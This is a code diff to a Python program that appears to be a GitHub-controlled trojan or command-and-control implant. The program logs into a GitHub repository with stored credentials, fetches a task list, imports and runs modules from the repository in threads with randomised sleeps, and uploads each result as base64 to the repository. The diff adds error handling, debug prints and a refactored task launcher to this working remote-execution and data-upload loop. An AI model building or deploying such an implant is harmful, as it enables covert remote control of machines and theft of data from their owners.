@@ -65,10 +65,13 @@ class GHWorker(object):
         return config
     def store_module_result(self, data):
         '''store the data'''
-        remote_path = '%s%d.data' % (self.data_path, random.randint(1000, 100000))
-        _, repo, _ = self.connect_to_github()
-        repo.create_file(remote_path, self.commit_message, base64.b64encode(data))
-        return
+        try:
+            remote_path = '%s%d.data' % (self.data_path, random.randint(1000, 100000))
+            _, repo, _ = self.connect_to_github()
+            repo.create_file(remote_path, self.commit_message, base64.b64encode(data))
+            return
+        except Exception as err:
+            print str(err)
 
 class GHImporter(object):
     '''import modules from gh'''
@@ -99,10 +102,12 @@ class Runner(object):
     def module_runner(self, module):
         '''run the module'''
         self.tasks.put(1)
-        result = sys.modules[module].run()
-        self.tasks.get()
+        mod = sys.modules[module]
+        print str(mod)
+        result = mod.run()
         # store the results
         self.worker.store_module_result(result)
+        self.tasks.get()
         return
     def main(self):
         '''main loop'''
@@ -110,11 +115,14 @@ class Runner(object):
         while True:
             if self.tasks.empty():
                 config = self.worker.get_config()
-                for task in config:
-                    thr = threading.Thread(target=self.module_runner, args=(task['module'],))
-                    thr.start()
-                    time.sleep(random.randint(1, 10))
-        time.sleep(random.randint(1000, 10000))
+                #self.runtask(config[0])
+                for task in config: self.runtask(task)
 
+        time.sleep(random.randint(1000, 10000))
+    def runtask(self, task):
+        '''run task in its own thread'''
+        thr = threading.Thread(target=self.module_runner, args=(task['module'],))
+        thr.start()
+        time.sleep(random.randint(1, 10))
 
 Runner(MY_GHC.uname, MY_GHC.pword, MY_GHC.repo_name, MY_GHC.repo_owner).main()
